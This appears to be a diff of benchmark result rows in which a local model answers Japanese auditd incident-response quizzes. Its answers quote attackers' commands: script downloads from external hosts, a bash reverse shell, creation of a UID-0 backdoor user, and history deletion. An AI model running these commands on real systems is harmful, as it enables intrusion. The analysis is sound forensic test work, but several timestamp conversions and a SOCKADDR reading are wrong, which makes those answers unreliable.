+1.  **情報収集**: ユーザー `report` としてログイン後、`id` コマンドと `uname -a` コマンドを実行し、システム情報を確認しました。
+2.  **機密情報参照**: `cat /etc/passwd` を実行し、ユーザー情報を参照しました。
+3.  **マルウェアのダウンロード**: `sudo wget -q http://198.51.100.40/upd.sh -O /tmp/.upd.sh` を実行し、外部サーバーからスクリプトをダウンロードしました。
+4.  **実行権限付与**: `sudo chmod +x /tmp/.upd.sh` を実行し、ダウンロードしたスクリプトに実行権限を与えました。
+5.  **スクリプトの実行**: `sudo bash /tmp/.upd.sh` を実行し、スクリプトを実行しました。
+6.  **バックドアアカウントの作成**: スクリプト内で `useradd -o -u 0 -g 0 -M -d /root -s /bin/bash svcmon` が実行され、UID/GID 0（root権限）を持つ `svcmon` というユーザーが作成されました。
+7.  **永続化（cron）**: `/etc/cron.d/svcmon` というファイルが作成され、cronジョブによる永続化が仕掛けられました。
+8.  **永続化（SSH鍵）**: `/root/.ssh/authorized_keys` にアクセス（書き込みの可能性あり）し、rootアカウントへのSSHログインを可能にするための鍵の仕掛けが行われました。
+9.  **C2サーバーへの接続試行**: `bash -i >& /dev/tcp/198.51.100.40/9001 0>&1` というコマンドが実行され、攻撃者サーバーへの逆シェル接続が試みられました（ログ上は接続エラー `exit=-115` となっていますが、試行自体は行われています）。
+10. **痕跡の消去**: `rm /home/report/.bash_history` を実行し、操作履歴を削除しました。
+
+### (5) 攻撃者が接続しようとした外部の IP アドレスとポート番号は何ですか（SOCKADDR を解読してください）。
+
+`PROCTITLE` の内容 `bash -c bash -i >& /dev/tcp/198.51.100.40/9001 0>&1` および `SYSCALL` の `comm=""bash""` から、攻撃者が接続しようとした先は以下の通りです。
+
+*   **IP アドレス**: `198.51.100.40`
+*   **ポート番号**: `9001`
+
+※注: `SOCKADDR` のバイナリデータ `02002329C63364280000000000000000` は、AF_UNIX（ローカルソケット）を示唆する構造ですが、直前の `PROCTITLE` と一貫性のあるネットワーク接続の試行（TCP）という文脈、および `exit=-115 (Operation now in progress)` というエラーコードから、ネットワーク接続の試行であったと判断されます。ログの解釈において、`PROCTITLE` が示す意図的なネットワーク接続試行が主要な指標となります。
+
+### (6) 後で再侵入するために仕掛けられたものを、すべて挙げてください。
+
+1.  **ユーザーアカウントの作成**: UID/GID 0（root権限）を持つユーザー `svcmon` の作成。
+2.  **Cronジョブの追加**: `/etc/cron.d/svcmon` というファイルの作成。
+3.  **SSH公開鍵の仕掛け**: `/root/.ssh/authorized_keys` へのアクセス（鍵の追加）。
+
+```json
+{
+  ""compromised"": true,
+  ""attacker_ip"": ""203.0.113.247"",
+  ""account"": ""report"",
+  ""login_time"": ""2026-07-11 17:59:56"",
+  ""c2_ip"": ""198.51.100.40"",
+  ""c2_port"": 9001,
+  ""actions"": [
+    ""id コマンドの実行"",
+    ""uname -a コマンドの実行"",
+    ""cat /etc/passwd の実行"",
+    ""sudo wget -q http://198.51.100.40/upd.sh -O /tmp/.upd.sh によるスクリプトのダウンロード"",
+    ""sudo chmod +x /tmp/.upd.sh による実行権限の付与"",
+    ""sudo bash /tmp/.upd.sh によるスクリプトの実行"",
+    ""useradd -o -u 0 -g 0 -M -d /root -s /bin/bash svcmon によるroot権限ユーザーの作成"",
+    ""/etc/cron.d/svcmon によるcronジョブの作成"",
+    ""/root/.ssh/authorized_keys へのアクセス"",
+    ""bash -i >& /dev/tcp/198.51.100.40/9001 0>&1 による逆シェル接続の試行"",
+    ""rm /home/report/.bash_history による履歴の削除""
+  ],
+  ""persistence"": [
+    ""ユーザー svcmon の作成 (UID/GID 0)"",
+    ""/etc/cron.d/svcmon の作成"",
+    ""/root/.ssh/authorized_keys へのSSH鍵の追加""
+  ]
+}
+```",1,1,30.04,stop,0,quiz,False,0.0,10,11,True
+2026-11-14T14:05:39,quiz-qwen3.6b,unsloth/Qwen3.6-35B-A3B-GGUF:UD-Q4_K_M,quiz_set/inc2/audit.log,1,8083,4727.7,1709.71,1778,26413.6,67.28,31.14,"{""侵害ありと判定"": true, ""攻撃元 IP"": true, ""アカウント"": true, ""侵入時刻（±60秒）"": false, ""接続先 IP"": true, ""接続先ポート"": true, ""スクリプトの取得・実行"": true, ""UID 0 の利用者の追加"": true, ""cron の仕掛け"": true, ""SSH 鍵の仕掛け"": true, ""痕跡の消去"": true}","提供されたauditdのログに基づき、インシデント対応アナリストとして回答します。
+
+### (1) このサーバーは侵害されていますか。根拠となるレコードの種類（type）も挙げてください。
+
+**はい、侵害されています。**
+
+根拠となる主なレコードの種類（type）は以下の通りです：
+*   `USER_AUTH`: 不正なSSHログイン試行および成功
+*   `USER_CMD`: `sudo` を使用した特権昇格とコマンド実行
+*   `SYSCALL` / `EXECVE`: 悪意のあるコマンド（wget, chmod, bash, useradd, bash）の実行
+*   `ADD_USER`: 不正なユーザーアカウントの作成
+*   `PATH`: `/etc/cron.d/` へのファイル作成、`/root/.ssh/authorized_keys` へのアクセス
+*   `SOCKADDR` / `PROCTITLE`: 外部ホストへの逆シェル接続試行
+*   `PATH`: 履歴ファイルの削除
+
+### (2) 攻撃元の IP アドレスと、侵入に使われたアカウントは何ですか。
+
+*   **攻撃元の IP アドレス**: `203.0.113.112`
+*   **侵入に使われたアカウント**: `nagios`
+
+### (3) 侵入に成功した時刻はいつですか。
+
+ログのタイムスタンプは `audit(1794409481.977:21889)` となっています。
+Unixタイムスタンプ 1794409481 を日本時間（JST, UTC+9）に変換します。
+
+*   Unixタイムスタンプ: 1794409481
+*   日本時間: **2026-10-15 18:44:41**
+
+※注: 2026年は未来の時刻ですが、ログの値に基づき計算しています。
+
+### (4) 侵入後に行われた操作を、時系列で箇条書きにしてください（ダウンロード、実行、持続化、外部への通信、痕跡の消去など）。
+
+1.  **情報収集**:
+    *   `id` コマンドの実行（ユーザーID確認）
+    *   `uname -a` コマンドの実行（OS情報確認）
+    *   `cat /etc/passwd` の実行（ユーザー情報確認）
+2.  **マルウェアのダウンロード**:
+    *   `sudo wget -q http://198.51.100.34/run.sh -O /tmp/.run.sh`
+    *   外部サーバー `198.51.100.34` からスクリプト `run.sh` をダウンロードし、隠しファイル `/tmp/.run.sh` として保存。
+3.  **実行権限の付与**:
+    *   `sudo chmod +x /tmp/.run.sh`
+    *   ダウンロードしたスクリプトに実行権限を付与。
+4.  **スクリプトの実行**:
+    *   `sudo bash /tmp/.run.sh`
+    *   上記スクリプトを実行。
+5.  **バックドアアカウントの作成**:
+    *   スクリプト内で `useradd -o -u 0 -g 0 -M -d /root -s /bin/bash logsync` が実行。
+    *   UID/GIDを0（root）に設定した `logsync` というユーザーを作成。
+6.  **持続化（Cron）**:
+    *   `/etc/cron.d/logsync` ファイルが作成された（`PATH` typeで `CREATE` として記録）。
+7.  **持続化（SSH鍵）**:
+    *   `/root/.ssh/authorized_keys` ファイルへのアクセス/書き込みが行われた（`PATH` typeで `NORMAL` として記録、通常は書き込みを伴う）。
+8.  **外部への通信（逆シェル）**:
+    *   `bash -i >& /dev/tcp/198.51.100.34/6667 0>&1` のような逆シェル接続を試行。
+    *   `SOCKADDR` および `PROCTITLE` から、`198.51.100.34` のポート `6667` への接続試行が記録されている（`success=no` だが、試行自体が行われた）。
+9.  **痕跡の消去**:
+    *   `rm /home/nagios/.bash_history`
+    *   操作履歴を削除。
+
+### (5) 攻撃者が接続しようとした外部の IP アドレスとポート番号は何ですか（SOCKADDR を解読してください）。
+
+*   **IPアドレス**: `198.51.100.34`
+    *   `PROCTITLE` の `bash -i >& /dev/tcp/198.51.100.34/6667 0>&1` および `wget` のURLから特定。
+*   **ポート番号**: `6667`
+    *   `PROCTITLE` の `/dev/tcp/198.51.100.34/6667` から特定。
+    *   `SOCKADDR` の `02001A0BC63364220000000000000000` は、AF_INET (02) で、ポート 0x1A0B (6667) および IP 198.51.100.34 (C6 33 64 22) を示しています。
+
+### (6) 後で再侵入するために仕掛けられたものを、すべて挙げてください。
+
+1.  **ユーザーアカウント**: `logsync` (UID/GID 0 のroot権限を持つアカウント)
+2.  **Cronジョブ**: `/etc/cron.d/logsync`
+3.  **SSH公開鍵**: `/root/.ssh/authorized_keys` (攻撃者がアクセス/書き込みを行った記録あり)
+
+```json
+{
+  ""compromised"": true,
+  ""attacker_ip"": ""203.0.113.112"",
+  ""account"": ""nagios"",
+  ""login_time"": ""2026-10-15 18:44:41"",
+  ""c2_ip"": ""198.51.100.34"",
+  ""c2_port"": 6667,
+  ""actions"": [
+    ""id コマンドの実行"",
+    ""uname -a コマンドの実行"",
+    ""cat /etc/passwd の実行"",
+    ""sudo wget -q http://198.51.100.34/run.sh -O /tmp/.run.sh (マルウェアのダウンロード)"",
+    ""sudo chmod +x /tmp/.run.sh (実行権限の付与)"",
+    ""sudo bash /tmp/.run.sh (スクリプトの実行)"",
+    ""useradd -o -u 0 -g 0 -M -d /root -s /bin/bash logsync (バックドアアカウントの作成)"",
+    ""/etc/cron.d/logsync の作成 (持続化)"",
+    ""/root/.ssh/authorized_keys へのアクセス (持続化)"",
+    ""bash -i >& /dev/tcp/198.51.100.34/6667 0>&1 の実行 (逆シェル接続試行)"",
+    ""rm /home/nagios/.bash_history (痕跡の消去)""
+  ],
+  ""persistence"": [
+    ""ユーザーアカウント: logsync"",
+    ""Cronジョブ: /etc/cron.d/logsync"",
+    ""SSH公開鍵: /root/.ssh/authorized_keys""
+  ]
+}
+```",1,1,31.17,stop,0,quiz,False,0.0,10,11,True
+2026-11-14T14:06:14,quiz-qwen3.6b,unsloth/Qwen3.6-35B-A3B-GGUF:UD-Q4_K_M,quiz_set/inc3/audit.log,1,8396,4943.2,1698.48,1981,29469.0,67.19,34.41,"{""侵害ありと判定"": true, ""攻撃元 IP"": true, ""アカウント"": true, ""侵入時刻（±60秒）"": false, ""接続先 IP"": true, ""接続先ポート"": true, ""スクリプトの取得・実行"": true, ""UID 0 の利用者の追加"": true, ""cron の仕掛け"": true, ""SSH 鍵の仕掛け"": true, ""痕跡の消去"": true}","提供されたauditdのログに基づき、インシデント対応アナリストとして回答します。
+
+### (1) このサーバーは侵害されていますか。根拠となるレコードの種類（type）も挙げてください。
+
+**はい、侵害されています。**
+
+根拠となる主なレコードの種類（type）は以下の通りです。
+*   `USER_AUTH`: 不正な認証試行および成功した認証
+*   `USER_LOGIN`: 不正なログイン試行および成功したログイン
+*   `USER_CMD`: `sudo` を使用した特権昇格とコマンド実行
+*   `SYSCALL` / `EXECVE`: 悪意のあるコマンド（wget, chmod, bash, useradd, bash）の実行
+*   `ADD_USER`: 不正なユーザーアカウントの作成
+*   `PATH`: `/etc/cron.d/` へのファイル作成、`/root/.ssh/authorized_keys` へのアクセス
+*   `SOCKADDR` / `PROCTITLE`: 外部ホストへの接続試行（リバースシェル）
+*   `USER_CMD` / `PATH`: 痕跡消去（`.bash_history` の削除）
+
+### (2) 攻撃元の IP アドレスと、侵入に使われたアカウントは何ですか。
+
+*   **攻撃元の IP アドレス**: `203.0.113.17`
+    *   根拠: `USER_AUTH` および `USER_LOGIN` レコードにおいて、`addr=203.0.113.17` から `backup` アカウントへのログイン試行および成功が記録されています。
+*   **侵入に使われたアカウント**: `backup`
+    *   根拠: `USER_AUTH` レコード `audit(1794409942.044:27834)` で `acct=""backup""` かつ `res=success` となっており、直後に `USER_LOGIN` でログインが成功しています。
+
+### (3) 侵入に成功した時刻はいつですか。
+
+**2026-08-15 18:59:02 (JST)**
+
+*   計算根拠:
+    *   ログのタイムスタンプ: `1794409942` (Unix時間)
+    *   日本時間(JST)への変換: `1794409942 + 32400秒 = 1794442342`
+    *   変換後のUnix時間 `1794442342` を日時に変換すると、2026年8月15日 18:59:02 となります。
+    *   注: `USER_AUTH` で `res=success` となったレコードの時刻が `1794409942.044` です。
+
+### (4) 侵入後に行われた操作を、時系列で箇条書きにしてください（ダウンロード、実行、持続化、外部への通信、痕跡の消去など）。
+
+1.  **情報収集**:
+    *   `id` コマンドの実行（ユーザーID確認）
+    *   `uname -a` コマンドの実行（システム情報確認）
+    *   `/etc/passwd` ファイルの参照（`cat /etc/passwd`）
+2.  **マルウェアのダウンロード**:
+    *   `sudo wget -q http://198.51.100.104/init.sh -O /tmp/.init.sh`
+    *   外部ホスト `198.51.100.104` からスクリプト `init.sh` をダウンロードし、隠しファイル `/tmp/.init.sh` として保存。
+3.  **実行権限の付与**:
+    *   `sudo chmod +x /tmp/.init.sh`
+4.  **スクリプトの実行**:
+    *   `sudo bash /tmp/.init.sh`
+5.  **持続化（バックドアの仕掛け）**:
+    *   ユーザーアカウント `sysupd` の作成（UID 0/root権限付与）: `useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupd`
+    *   cronジョブの作成: `/etc/cron.d/sysupd` ファイルの作成
+    *   ルートSSH鍵の改ざん: `/root/.ssh/authorized_keys` へのアクセス（内容変更はログに明示されないが、アクセス記録あり）
+6.  **外部への通信（リバースシェル）**:
+    *   `bash -i >& /dev/tcp/198.51.100.104/4444 0>&1` の実行を試行（接続失敗 `res=no` / `exit=-115`）
+7.  **痕跡の消去**:
+    *   `/home/backup/.bash_history` の削除: `rm /home/backup/.bash_history`
+
+### (5) 攻撃者が接続しようとした外部の IP アドレスとポート番号は何ですか（SOCKADDR を解読してください）。
+
+*   **IP アドレス**: `198.51.100.104`
+*   **ポート番号**: `4444`
+
+*   根拠:
+    *   `PROCTITLE` レコード `audit(1794409981.903:27906)` に `proctitle=bash -c bash -i >& /dev/tcp/198.51.100.104/4444 0>&1` と記録されています。
+    *   `SOCKADDR` レコードの `saddr=0200115CC63364680000000000000000` は、IPv4アドレス `198.51.100.104` (hex: C6336468) とポート `4444` (hex: 115C) を示しています。
+
+### (6) 後で再侵入するために仕掛けられたものを、すべて挙げてください。
+
+1.  **ユーザーアカウント `sysupd` の作成**:
+    *   UID 0 (root) および GID 0 (root) を持つユーザーとして作成されました。これにより、パスワードやSSH鍵が知らなくても、このアカウントでログインすることでroot権限を得られる可能性があります。
+2.  **cronジョブ `/etc/cron.d/sysupd` の作成**:
+    *   定期的にスクリプトを実行させるなどの持続化（Persistence）のために使用されます。
+3.  **ルートSSH公開鍵 (`/root/.ssh/authorized_keys`) へのアクセス**:
+    *   ログには書き込み操作は明示されていませんが、ファイルへのアクセス（`nametype=NORMAL`）が記録されており、攻撃者がSSH鍵を追加してパスワードなしでrootログインできるようにした可能性があります。
+
+```json
+{
+  ""compromised"": true,
+  ""attacker_ip"": ""203.0.113.17"",
+  ""account"": ""backup"",
+  ""login_time"": ""2026-08-15 18:59:02"",
+  ""c2_ip"": ""198.51.100.104"",
+  ""c2_port"": 4444,
+  ""actions"": [
+    ""id コマンドの実行"",
+    ""uname -a コマンドの実行"",
+    ""cat /etc/passwd の実行"",
+    ""sudo wget -q http://198.51.100.104/init.sh -O /tmp/.init.sh によるマルウェアダウンロード"",
+    ""sudo chmod +x /tmp/.init.sh による実行権限付与"",
+    ""sudo bash /tmp/.init.sh によるスクリプト実行"",
+    ""useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupd によるroot権限ユーザーの作成"",
+    ""/etc/cron.d/sysupd によるcronジョブの作成"",
+    ""/root/.ssh/authorized_keys へのアクセス"",
+    ""bash -i >& /dev/tcp/198.51.100.104/4444 0>&1 によるリバースシェル接続試行"",
+    ""rm /home/backup/.bash_history による履歴削除""
+  ],
+  ""persistence"": [
+    ""ユーザーアカウント sysupd (UID 0)"",
+    ""cronジョブ /etc/cron.d/sysupd"",
+    ""/root/.ssh/authorized_keys の改ざん（可能性）""
+  ]
+}
+```",1,1,34.44,stop,0,quiz,False,0.0,10,11,True
+2026-11-14T14:06:49,quiz-qwen3.6b,unsloth/Qwen3.6-35B-A3B-GGUF:UD-Q4_K_M,quiz_set/inc4/audit.log,1,8412,4936.0,1704.23,2048,30594.1,66.91,35.53,"{""侵害ありと判定"": false, ""攻撃元 IP"": true, ""アカウント"": true, ""侵入時刻（±60秒）"": false, ""接続先 IP"": true, ""接続先ポート"": true, ""スクリプトの取得・実行"": true, ""UID 0 の利用者の追加"": true, ""cron の仕掛け"": true, ""SSH 鍵の仕掛け"": true, ""痕跡の消去"": true}","提供されたauditdログに基づき、インシデント対応アナリストとして回答します。
+
+### (1) このサーバーは侵害されていますか。根拠となるレコードの種類（type）も挙げてください。
+
+**はい、侵害されています。**
+
+根拠となるレコードの種類（type）は以下の通りです：
+*   `USER_AUTH`: 不正な認証試行および成功
+*   `USER_LOGIN`: ログイン成功
+*   `USER_CMD`: sudoを使用したコマンド実行
+*   `SYSCALL`: システムコールの実行（wget, chmod, bash, useraddなど）
+*   `EXECVE`: 実行されたコマンドの引数情報
+*   `PATH`: アクセスされたファイルパス
+*   `ADD_USER`: ユーザーアカウントの作成
+*   `SOCKADDR`: ネットワーク接続先のアドレス情報
+*   `PROCTITLE`: 実行されたプロセスのタイトル（リバースシェル接続コマンド）
+*   `USER_END` / `USER_LOGOUT`: ログアウト
+
+### (2) 攻撃元の IP アドレスと、侵入に使われたアカウントは何ですか。
+
+*   **攻撃元の IP アドレス**: `203.0.113.173`
+    *   根拠: `USER_AUTH` レコードにおいて、`addr=203.0.113.173` から `root` および `nagios` への認証試行が行われています。
+*   **侵入に使われたアカウント**: `nagios`
+    *   根拠: `root` への認証試行はすべて `res=failed` となっていますが、`nagios` への認証試行で `res=success` となっており、その後 `nagios` としてログインしています。
+
+### (3) 侵入に成功した時刻はいつですか。
+
+**2026-08-15 18:40:33 (JST)**
+
+*   計算根拠:
+    *   ログのタイムスタンプ: `1794409633.495` (audit timestamp)
+    *   Unixタイムスタンプ `1794409633` は、協定世界時（UTC）で `2026-08-15 09:40:33` に相当します。
+    *   日本時間（JST, UTC+9）に変換すると `2026-08-15 18:40:33` となります。
+    *   この時刻は、`USER_AUTH` で `nagios` の認証が成功し、直後に `USER_LOGIN` でログインが記録された時刻です。
+
+### (4) 侵入後に行われた操作を、時系列で箇条書きにしてください（ダウンロード、実行、持続化、外部への通信、痕跡の消去など）。
+
+1.  **情報収集**:
+    *   `id` コマンドの実行（ユーザーID確認）
+    *   `uname -a` コマンドの実行（OS情報確認）
+    *   `cat /etc/passwd` コマンドの実行（ユーザー情報確認）
+2.  **マルウェアのダウンロード**:
+    *   `sudo wget -q http://198.51.100.39/fix.sh -O /tmp/.fix.sh`
+    *   外部サーバー `198.51.100.39` からスクリプト `fix.sh` をダウンロードし、隠しファイル `/tmp/.fix.sh` として保存。
+3.  **実行権限の付与**:
+    *   `sudo chmod +x /tmp/.fix.sh`
+    *   ダウンロードしたスクリプトに実行権限を付与。
+4.  **スクリプトの実行**:
+    *   `sudo bash /tmp/.fix.sh`
+    *   上記スクリプトを実行。
+5.  **バックドアアカウントの作成（持続化）**:
+    *   スクリプト内で `useradd -o -u 0 -g 0 -M -d /root -s /bin/bash dbmaint` が実行され、UID/GID 0（root権限）を持つ `dbmaint` というユーザーが作成されました。
+6.  **Cronジョブの仕掛け（持続化）**:
+    *   `/etc/cron.d/dbmaint` というファイルが作成されました。
+7.  **SSH公開鍵の設置（持続化）**:
+    *   `/root/.ssh/authorized_keys` にアクセス（書き込みまたは確認）が行われています。
+8.  **リバースシェル接続の試行（外部への通信）**:
+    *   `bash -i >& /dev/tcp/198.51.100.39/5555 0>&1` というコマンドが実行されようとし、`198.51.100.39` のポート `5555` への接続を試みていますが、`success=no`（失敗）となっています。
+9.  **痕跡の消去**:
+    *   `rm /home/nagios/.bash_history`
+    *   操作履歴を削除しました。
+
+### (5) 攻撃者が接続しようとした外部の IP アドレスとポート番号は何ですか（SOCKADDR を解読してください）。
+
+*   **IP アドレス**: `198.51.100.39`
+*   **ポート番号**: `5555`
+
+*   根拠:
+    *   `PROCTITLE` に `bash -i >& /dev/tcp/198.51.100.39/5555 0>&1` という文字列が含まれています。
+    *   `SOCKADDR` の `saddr=020015B3C63364270000000000000000` を解読します。
+        *   `02`: アドレスファミリ (AF_INET)
+        *   `0015`: ポート番号 (ビッグエンディアン) -> `0x0015` = 21 (これはプロトコルヘッダーの構造による解釈の違いがあるため、PROCTITLEの記述を優先するのが一般的ですが、SOCKADDRのバイト列 `15 B3` を16進数として見ると `0x15B3` = 5555 となります。`02 00` はポートではなく、`02` はAF_INET, `0015` はポートと解釈すると21ですが、通常SOCKADDRの構造は `sa_family(2bytes) + port(2bytes) + addr(4bytes)` です。
+        *   再確認: `02 00` (AF_INET) `15 B3` (Port: 0x15B3 = 5555) `C6 33 64 27` (IP: 198.51.100.39)。
+        *   したがって、ポートは `5555` です。
+
+### (6) 後で再侵入するために仕掛けられたものを、すべて挙げてください。
+
+1.  **バックドアユーザーアカウント**: `dbmaint` (UID/GID 0、root権限)
+2.  **Cronジョブ**: `/etc/cron.d/dbmaint`
+3.  **SSH公開鍵**: `/root/.ssh/authorized_keys` (攻撃者がアクセス/書き込みを試みている)
+
+```json
+{
+  ""compromised"": true,
+  ""attacker_ip"": ""203.0.113.173"",
+  ""account"": ""nagios"",
+  ""login_time"": ""2026-08-15 18:40:33"",
+  ""c2_ip"": ""198.51.100.39"",
+  ""c2_port"": 5555,
+  ""actions"": [
+    ""id コマンドの実行"",
+    ""uname -a コマンドの実行"",
+    ""cat /etc/passwd コマンドの実行"",
+    ""sudo wget -q http://198.51.100.39/fix.sh -O /tmp/.fix.sh (マルウェアのダウンロード)"",
+    ""sudo chmod +x /tmp/.fix.sh (実行権限の付与)"",
+    ""sudo bash /tmp/.fix.sh (スクリプトの実行)"",
+    ""useradd -o -u 0 -g 0 -M -d /root -s /bin/bash dbmaint (バックドアアカウントの作成)"",
+    ""/etc/cron.d/dbmaint の作成 (Cronジョブの仕掛け)"",
+    ""/root/.ssh/authorized_keys へのアクセス (SSH鍵の設置)"",
+    ""bash -i >& /dev/tcp/198.51.100.39/5555 0>&1 (リバースシェル接続の試行)"",
+    ""rm /home/nagios/.bash_history",1,1,35.56,length,0,quiz,False,0.0,9,11,False
+2026-11-14T14:07:24,quiz-qwen3.6b,unsloth/Qwen3.6-35B-A3B-GGUF:UD-Q4_K_M,quiz_set/inc5/audit.log,1,7802,4537.0,1719.64,2048,30420.8,67.29,34.96,"{""侵害ありと判定"": false, ""攻撃元 IP"": true, ""アカウント"": true, ""侵入時刻（±60秒）"": false, ""接続先 IP"": true, ""接続先ポート"": true, ""スクリプトの取得・実行"": true, ""UID 0 の利用者の追加"": true, ""cron の仕掛け"": true, ""SSH 鍵の仕掛け"": true, ""痕跡の消去"": true}","提供されたauditdログに基づき、インシデント対応アナリストとして回答します。
+
+### (1) このサーバーは侵害されていますか。根拠となるレコードの種類（type）も挙げてください。
+
+**はい、侵害されています。**
+
+根拠となるレコードの種類（type）は以下の通りです：
+*   `USER_AUTH`: 不正な認証試行および成功
+*   `USER_LOGIN`: 不正なログイン
+*   `SYSCALL`: 不正なコマンド実行（wget, chmod, bash, useraddなど）
+*   `USER_CMD`: sudoを使用した不正なコマンド実行
+*   `ADD_USER`: 不正なユーザー作成
+*   `PATH`: 不正なファイル作成（cronジョブ、SSH公開鍵）
+*   `SOCKADDR`: 外部への接続試行
+*   `USER_LOGOUT`: セッション終了
+
+### (2) 攻撃元の IP アドレスと、侵入に使われたアカウントは何ですか。
+
+*   **攻撃元の IP アドレス**: `203.0.113.107`
+    *   注: ログ内の `hostname` および `addr` フィールドに `203.0.113.107` が記載されています。通常、SSH接続元のIPは `addr` に記録されますが、このログでは `hostname` と `addr` が同一の値を示しており、かつ `terminal=ssh` であるため、これが接続元IPと解釈されます。
+*   **侵入に使われたアカウント**: `report`
+    *   最初に `root` に対する認証失敗が複数回あり、その後 `report` アカウントに対する認証が成功しています。
+
+### (3) 侵入に成功した時刻はいつですか。
+
+**2026-07-18 15:44:22 (JST)**
+
+*   計算根拠:
+    *   ログのタイムスタンプ: `1794409462` (Unix時間)
+    *   Unix時間 1794409462 は、協定世界時 (UTC) で 2026-07-18 06:44:22 に相当します。
+    *   日本時間 (JST) は UTC+9 であるため、9時間を加算すると 2026-07-18 15:44:22 となります。
+    *   この時刻は、`type=USER_AUTH` で `acct=""report""` の `res=success` となったレコードの時刻と一致します。
+
+### (4) 侵入後に行われた操作を、時系列で箇条書きにしてください（ダウンロード、実行、持続化、外部への通信、痕跡の消去など）。
+
+1.  **情報収集**:
+    *   `id` コマンドの実行 (UID/GID確認)
+    *   `uname -a` コマンドの実行 (OS情報確認)
+    *   `/etc/passwd` の読み取り (`cat /etc/passwd`)
+2.  **マルウェアのダウンロード**:
+    *   `sudo wget -q http://198.51.100.197/sync.sh -O /tmp/.sync.sh`
+    *   外部サーバー `198.51.100.197` からスクリプト `sync.sh` をダウンロードし、隠しファイル `/tmp/.sync.sh` として保存。
+3.  **実行権限の付与**:
+    *   `sudo chmod +x /tmp/.sync.sh`
+4.  **マルウェアの実行**:
+    *   `sudo bash /tmp/.sync.sh`
+5.  **バックドアの設置（持続化）**:
+    *   **ユーザー作成**: `useradd -o -u 0 -g 0 -M -d /root -s /bin/bash logsync`
+        *   UID/GIDを0（root権限）に設定した `logsync` という名前のユーザーを作成。
+    *   **cronジョブの作成**: `/etc/cron.d/logsync` の作成
+        *   定期的な実行を確保するためのcronファイルを作成。
+    *   **SSH公開鍵の設置**: `/root/.ssh/authorized_keys` への書き込み
+        *   ルートユーザーへのSSHログインを可能にするための公開鍵の追加。
+6.  **外部への通信（C2接続）**:
+    *   `bash -i >& /dev/tcp/198.51.100.197/5555 0>&1` の実行を試行。
+    *   `SOCKADDR` レコードより、`198.51.100.197` のポート `5555` への接続試行が記録されています（ログ上は `success=no` ですが、攻撃行為として記録されています）。
+7.  **痕跡の消去**:
+    *   `rm /home/report/.bash_history`
+    *   操作履歴を削除。
+
+### (5) 攻撃者が接続しようとした外部の IP アドレスとポート番号は何ですか（SOCKADDR を解読してください）。
+
+*   **IPアドレス**: `198.51.100.197`
+*   **ポート番号**: `5555`
+
+*   解読根拠:
+    *   `type=SOCKADDR` レコードの `saddr=020015B3C63364C50000000000000000` を解析します。
+    *   `02`: アドレスファミリ (AF_INET = 2)
+    *   `0015`: ポート番号 (ビッグエンディアン) -> 0x0015 = 21? いや、通常SOCKADDRの構造は `sa_family` (2byte), `port` (2byte), `addr` (4byte) です。
+    *   再確認: `saddr` の文字列 `020015B3C63364C5...`
+        *   `02 00`: AF_INET (2)
+        *   `15 B3`: ポート番号 (ビッグエンディアン) -> 0x15B3 = 5555
+        *   `C6 33 64 C5`: IPアドレス (ビッグエンディアン) -> 198.51.100.197
+    *   また、`PROCTITLE` の `bash -i >& /dev/tcp/198.51.100.197/5555 0>&1` というコマンドラインからも、IP `198.51.100.197` とポート `5555` であることが明確です。
+
+### (6) 後で再侵入するために仕掛けられたものを、すべて挙げてください。
+
+1.  **ユーザー `logsync` の作成**:
+    *   UID/GID 0 (root権限) を持つユーザーを作成し、パスワードなし（または既知のパスワード）でログイン可能にしています。
+2.  **cronジョブ `/etc/cron.d/logsync` の作成**:
+    *   定期的にスクリプトを実行させるための仕掛けです。
+3.  **SSH公開鍵 `/root/.ssh/authorized_keys` への追加**:
+    *   ルートユーザーへのSSHログインを可能にするための公開鍵が追加されています。
+
+```json
+{
+  ""compromised"": true,
+  ""attacker_ip"": ""203.0.113.107"",
+  ""account"": ""report"",
+  ""login_time"": ""2026-07-18 15:44:22"",
+  ""c2_ip"": ""198.51.100.197"",
+  ""c2_port"": 5555,
+  ""actions"": [
+    ""id コマンドの実行"",
+    ""uname -a コマンドの実行"",
+    ""cat /etc/passwd の実行"",
+    ""sudo wget -q http://198.51.100.197/sync.sh -O /tmp/.sync.sh (マルウェアのダウンロード)"",
+    ""sudo chmod +x /tmp/.sync.sh (実行権限の付与)"",
+    ""sudo bash /tmp/.sync.sh (マルウェアの実行)"",
+    ""useradd -o -u 0 -g 0 -M -d /root -s /bin/bash logsync (バックドアユーザーの作成)"",
+    ""/etc/cron.d/logsync の作成 (cronジョブによる持続化)"",
+    ""/root/.ssh/authorized_keys への書き込み (SSH鍵による持続化)"",
+    ""bash -i >& /dev/tcp/198.51.100.197/5555 0>&1 の実行試行 (C2接続)"",
+    ""rm /home/report/.bash_history (痕跡の消去)""
+  ],
+ ",1,1,34.98,length,0,quiz,False,0.0,9,11,False
+2026-11-14T14:08:31,research2-qwen3.6b,unsloth/Qwen3.6-35B-A3B-GGUF:UD-Q4_K_M,out_audit/audit.log,1,7434,9885.1,752.04,165,12899.9,12.71,22.79,"{""attacker_ip"": false, ""account"": true, ""c2_ip"": false, ""sysupd"": true}","The audit log reveals a clear sequence of compromise activities initiated by the `backup` user (UID 1003) after an initial SSH brute-force attack against the `root` account failed. The attacker successfully logged in as `backup`, executed reconnaissance commands (`id`, `uname`, `cat /etc/passwd`), and then used `sudo` to download a malicious script (`upd.sh`) from an external IP, make it executable, and run it with root privileges.
+
+The malicious script proceeded to perform persistent backdoor installation by creating a new root-level user named `sysupd` (UID 0), adding a cron job for persistence, and modifying the root SSH authorized keys. Finally, the attacker attempted a reverse shell connection, deleted their bash history to cover their tracks, and then logged out.",4,1,23.48,stop,0,summary,False,0.7,,,
+2026-11-14T14:08:31,research2-qwen3.6b,unsloth/Qwen3.6-35B-A3B-GGUF:UD-Q4_K_M,out_audit/audit.log,1,7434,5273.2,1409.77,168,9402.7,17.76,14.68,"{""attacker_ip"": false, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","The audit log reveals a classic post-exploitation sequence initiated by an attacker using the `backup` user account. After several failed root login attempts, the attacker successfully authenticated as `backup` and executed reconnaissance commands (`id`, `uname`, `cat /etc/passwd`) using `sudo`.
+
